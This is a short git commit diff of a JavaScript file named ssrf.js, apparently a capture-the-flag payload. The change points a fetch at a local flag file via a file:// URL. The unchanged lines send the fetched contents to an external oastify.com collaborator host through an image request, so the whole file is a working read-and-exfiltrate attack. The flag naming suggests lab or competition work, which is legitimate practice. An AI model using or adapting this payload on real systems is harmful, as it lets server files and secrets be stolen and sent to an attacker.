8220a75bccd491455d35bc663972363d756d1ac5
blackdustbb <112851139+blackdustbb@users.noreply.github.com>
2026-03-23 14:50:33 +0530

    Update ssrf.js

--- ssrf.js
+++ ssrf.js
@@ -1,4 +1,4 @@
-fetch("/admin/retrieve-flag-2-new")
+fetch("file:///var/www/html/flag.txt")
 .then(r=>r.text())
 .then(f=>{
 new Image().src="https://10z31apdo20ojpay1g5ivkp6yx4vsogd.oastify.com?flag="+encodeURIComponent(f)
